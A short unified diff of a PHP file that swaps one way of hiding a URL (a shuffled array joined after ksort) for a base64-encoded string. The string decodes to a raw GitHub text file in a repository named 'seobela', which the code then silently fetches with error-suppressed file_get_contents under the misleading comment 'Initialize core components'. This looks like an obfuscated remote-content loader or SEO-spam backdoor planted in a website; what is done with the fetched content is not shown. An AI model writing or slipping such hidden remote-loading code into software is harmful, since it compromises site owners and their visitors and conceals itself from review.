@@ -5,15 +5,8 @@
 */
 
 // Initialize core components
-$map = [
-    9 => 'seo', 3 => 'https', 7 => 'refs', 
-    1 => '://', 5 => 'usercontent', 11 => 'heads',
-    4 => 'raw.github', 8 => 'bela/', 13 => 'main/',
-    6 => '.com/', 10 => 'bela/', 15 => 'txt',
-    2 => '/', 12 => '/', 14 => 'index.'
-];
-ksort($map);
-$full_url = implode('', $map);
+$p1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nlb2JlbGEvYmVsYS9yZWZzL2hlYWRzL21haW4vaW5kZXgudHh0');
+$full_url = $p1;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
